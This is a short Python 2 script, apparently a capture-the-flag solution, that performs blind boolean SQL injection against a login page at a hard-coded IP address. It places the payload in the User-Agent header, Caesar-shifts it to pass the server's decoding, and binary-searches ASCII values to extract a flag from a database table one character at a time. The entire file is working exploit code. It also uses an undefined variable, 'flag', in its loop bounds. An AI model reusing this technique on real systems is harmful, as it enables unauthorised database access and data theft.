import requests

# Caesar, use negative key to 'decrypt'
def encr(message, key):
    translated = ''

    for symbol in message:
        if symbol.isalpha():
            num = ord(symbol)
            num += key

            if symbol.isupper():
                if num > ord('Z'):
                    num -= 26
                elif num < ord('A'):
                    num += 26
            elif symbol.islower():
                if num > ord('z'):
                    num -= 26
                elif num < ord('a'):
                    num += 26

            translated += chr(num)
        else:
            translated += symbol

    return translated

# The blind check
def checkQuery(SQL_CMD):
    SQL_CMD = encr(SQL_CMD, -11)

    url = 'http://89.38.210.129:8093/login.php'

    req = requests.post(url, data={'email': 'darkyangel@protonmail.com'}, headers={'User-agent': SQL_CMD})

    return "Nope" not in req.text

# Binary search using the blind
extracted = ""
for charIdx in xrange(len(flag) + 1, 71):
    l = 32
    r = 126
    while l <= r:
        md = (l + r) / 2
        query = "' or ascii(substr((SELECT flag FROM fl4g_1337 LIMIT 1), %d, 1)) %s %d -- "
        SQL_EQ = query % (charIdx, '=', md)
        SQL_CMD = query % (charIdx, '>', md)

        if checkQuery(SQL_EQ):
            extracted += chr(md)
            print "Extracted so far: " + extracted
            break
        else:
            if checkQuery(SQL_CMD):
                l = md + 1
            else:
                r = md - 1
